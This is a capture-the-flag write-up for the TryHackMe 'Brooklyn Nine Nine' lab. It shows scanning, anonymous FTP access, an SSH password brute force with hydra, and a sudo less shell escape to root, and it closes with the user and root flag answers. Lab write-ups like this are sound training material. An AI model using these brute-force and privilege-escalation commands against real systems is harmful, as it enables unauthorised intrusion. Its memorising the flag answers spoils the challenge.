# Brooklyn Nine Nine

#### This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.

<br/>

### NMAP SCAN

```
# Nmap 7.60 scan initiated Fri Aug  6 15:56:17 2021 as: nmap -sC -sV -oN nmap.txt 10.10.142.32
Nmap scan report for ip-10-10-142-32.eu-west-1.compute.internal (10.10.142.32)
Host is up (0.027s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.45.255
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (EdDSA)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:7D:1A:19:CD:2D (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug  6 15:56:28 2021 -- 1 IP address (1 host up) scanned in 10.41 seconds

```

### NIKTO SCAN

```
root@ip-10-10-45-255:~/Desktop# nikto -h 10.10.142.32 -o nikto.txt
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.142.32
+ Target Hostname:    ip-10-10-142-32.eu-west-1.compute.internal
+ Target Port:        80
+ Start Time:         2021-08-06 16:10:01 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.29 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x2ce 0x5a5ee14bb8d76
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2021-08-06 16:10:11 (GMT1) (10 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

<p>Nmap Scan Show We can access FTP with Anonymous Login</p>
<p>Lets Enumerate FTP</p>

```
root@ip-10-10-45-255:~/Desktop# ftp 10.10.142.32
Connected to 10.10.142.32.
220 (vsFTPd 3.0.3)
Name (10.10.142.32:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 May 17  2020 .
drwxr-xr-x    2 0        114          4096 May 17  2020 ..
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> lcd /root/Desktop/
Local directory now /root/Desktop
ftp> mget *
mget note_to_jake.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.00 secs (1.4186 MB/s)
ftp> exit
221 Goodbye.


root@ip-10-10-45-255:~/Desktop# ls -la
total 24
drwxr-xr-x  3 root root 4096 Aug  6 16:03  .
drwxr-xr-x 35 root root 4096 Aug  6 15:46  ..
lrwxrwxrwx  1 root root    5 Sep 10  2020 'Additional Tools' -> /opt/
-rwxr-xr-x  1 root root  173 Aug 15  2020  mozo-made-15.desktop
-rw-r--r--  1 root root 1547 Aug  6 15:56  nmap.txt
-rw-r--r--  1 root root  119 Aug  6 16:03  note_to_jake.txt
drwxr-xr-x  9 root root 4096 Mar 18 18:03  Tools
root@ip-10-10-45-255:~/Desktop# cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```

<p>We can see Port 80 (Web Server) Open on Machine.</p>

![Home Page](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/Brooklyn-Nine-Nine/Picture-1.png "Home Page")

<p>Fuzz Directory</p>

### GOBUSTER SCAN

```
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/.hta (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)

```

<p>Lets View Page Source </p>

```
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body, html {
  height: 100%;
  margin: 0;
}

.bg {
/_ The image used _/
background-image: url("brooklyn99.jpg");

/_ Full height _/
height: 100%;

/_ Center and scale the image nicely _/
background-position: center;
background-repeat: no-repeat;
background-size: cover;
}
</style>

</head>
<body>

<div class="bg"></div>

<p>This example creates a full page background image. Try to resize the browser window to see how it always will cover the full screen (when scrolled to top), and that it scales nicely on all screen sizes.</p>
<!-- Have you ever heard of steganography? -->
</body>
</html>

```

<p>Nothing Interesting on Web Server. Lets Check SSH</p>

<p>By Reading note_to_jake.txt file We found one Username <em>Jake</em> </p>

<p>SSH Port  is alos Open, Lets Bruteforce SSH Login With Hydra. The txt file talking about Weak password so we can easily Brutefore SSH Credentials</p>

```
root@ip-10-10-45-255:~/Desktop# hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.142.32
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2021-08-06 16:25:48
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ssh://10.10.142.32:22/
[22][ssh] host: 10.10.142.32   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 6 final worker threads did not complete until end.
[ERROR] 6 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2021-08-06 16:26:31
root@ip-10-10-45-255:~/Desktop#

```

<p>Lets Login SSH with Username <b>jake</b> and Password <b>987654321</b></p>

```
root@ip-10-10-45-255:~/Desktop# ssh jake@10.10.142.32
The authenticity of host '10.10.142.32 (10.10.142.32)' can't be established.
ECDSA key fingerprint is SHA256:Ofp49Dp4VBPb3v/vGM9jYfTRiwpg2v28x1uGhvoJ7K4.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.142.32' (ECDSA) to the list of known hosts.
jake@10.10.142.32's password:
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ ls -la
total 44
drwxr-xr-x 6 jake jake 4096 May 26 2020 .
drwxr-xr-x 5 root root 4096 May 18 2020 ..
-rw------- 1 root root 1349 May 26 2020 .bash_history
-rw-r--r-- 1 jake jake 220 Apr 4 2018 .bash_logout
-rw-r--r-- 1 jake jake 3771 Apr 4 2018 .bashrc
drwx------ 2 jake jake 4096 May 17 2020 .cache
drwx------ 3 jake jake 4096 May 17 2020 .gnupg
-rw------- 1 root root 67 May 26 2020 .lesshst
drwxrwxr-x 3 jake jake 4096 May 26 2020 .local
-rw-r--r-- 1 jake jake 807 Apr 4 2018 .profile
drwx------ 2 jake jake 4096 May 18 2020 .ssh
-rw-r--r-- 1 jake jake 0 May 17 2020 .sudo_as_admin_successful

```

<p>Lets Check if we have some sudo Permission</p>

```
jake@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
(ALL) NOPASSWD: /usr/bin/less

```

<p>We can run /usr/bin/less on machine</p>
<p>Lets find priviledge esclation method on gtfobins Website</p>

<p>If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</p>

```
sudo less /etc/profile
!/bin/sh
```

<p>By using above command we can now Root</p>

```
jake@brookly_nine_nine:~$ sudo less /etc/profile

#

# whoami

root

# python -c 'import pty;pty.spawn("/bin/bash")'

/bin/sh: 3: python: not found

# python3 -c 'import pty;pty.spawn("/bin/bash")'

root@brookly_nine_nine:~#
root@brookly_nine_nine:~#
root@brookly_nine_nine:~# cd /root
root@brookly_nine_nine:/root# ls -la
total 32
drwx------ 4 root root 4096 May 18 2020 .
drwxr-xr-x 24 root root 4096 May 19 2020 ..
-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrc
drwxr-xr-x 3 root root 4096 May 17 2020 .local
-rw-r--r-- 1 root root 148 Aug 17 2015 .profile
drwx------ 2 root root 4096 May 18 2020 .ssh
-rw-r--r-- 1 root root 165 May 17 2020 .wget-hsts
-rw-r--r-- 1 root root 135 May 18 2020 root.txt
root@brookly_nine_nine:/root# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
root@brookly_nine_nine:/root#

```

<p>Lets find User.txt</p>

```
root@brookly_nine_nine:/root# cd /home
root@brookly_nine_nine:/home# ls -la
total 20
drwxr-xr-x 5 root root 4096 May 18 2020 .
drwxr-xr-x 24 root root 4096 May 19 2020 ..
drwxr-xr-x 5 amy amy 4096 May 18 2020 amy
drwxr-xr-x 6 holt holt 4096 May 26 2020 holt
drwxr-xr-x 6 jake jake 4096 May 26 2020 jake
root@brookly_nine_nine:/home# cd amy
root@brookly_nine_nine:/home/amy# ls -la
total 32
drwxr-xr-x 5 amy amy 4096 May 18 2020 .
drwxr-xr-x 5 root root 4096 May 18 2020 ..
-rw-r--r-- 1 amy amy 220 May 17 2020 .bash_logout
-rw-r--r-- 1 amy amy 3771 May 17 2020 .bashrc
drwx------ 2 amy amy 4096 May 18 2020 .cache
drwx------ 3 amy amy 4096 May 18 2020 .gnupg
-rw-r--r-- 1 amy amy 807 May 17 2020 .profile
drwx------ 2 amy amy 4096 May 17 2020 .ssh
root@brookly_nine_nine:/home/amy# cd /holt
bash: cd: /holt: No such file or directory
root@brookly_nine_nine:/home/amy# cd /home/holt
root@brookly_nine_nine:/home/holt# ls -la
total 48
drwxr-xr-x 6 holt holt 4096 May 26 2020 .
drwxr-xr-x 5 root root 4096 May 18 2020 ..
-rw------- 1 holt holt 18 May 26 2020 .bash_history
-rw-r--r-- 1 holt holt 220 May 17 2020 .bash_logout
-rw-r--r-- 1 holt holt 3771 May 17 2020 .bashrc
drwx------ 2 holt holt 4096 May 18 2020 .cache
drwx------ 3 holt holt 4096 May 18 2020 .gnupg
drwxrwxr-x 3 holt holt 4096 May 17 2020 .local
-rw-r--r-- 1 holt holt 807 May 17 2020 .profile
drwx------ 2 holt holt 4096 May 18 2020 .ssh
-rw------- 1 root root 110 May 18 2020 nano.save
-rw-rw-r-- 1 holt holt 33 May 17 2020 user.txt
root@brookly_nine_nine:/home/holt# cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
root@brookly_nine_nine:/home/holt#
```

### Task 1: Deploy and get hacking.

```
1. User flag
   Ans: ee11cbb19052e40b07aac0ca060c23ee

2. Root Flag
   Ans: 63a9f0ea7bb98050796b649e85481845

```
